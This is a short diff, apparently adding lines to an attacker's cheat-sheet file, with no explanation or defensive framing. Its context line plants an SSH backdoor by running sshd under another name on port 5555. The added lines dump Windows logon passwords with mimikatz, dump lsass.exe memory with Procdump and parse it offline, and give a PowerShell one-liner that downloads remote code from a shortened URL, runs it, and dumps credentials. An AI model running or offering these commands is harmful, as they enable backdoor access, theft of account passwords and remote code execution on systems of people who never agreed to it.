@@ -44,3 +44,14 @@ backdoor
 ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=5555;
 
 
+
+#mimikatz
+mimikatz privilege::debug log sekurlsa::logonpasswords exit
+
+#Procdump
+Procdump.exe -accepteula -ma lsass.exe lsass.dmp
+mimikatz sekurlsa::minidump lsass.dmp log sekurlsa::logonPasswords full
+
+#powershell
+powershell "IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI'); Invoke-Mimikatz -DumpCreds"
+
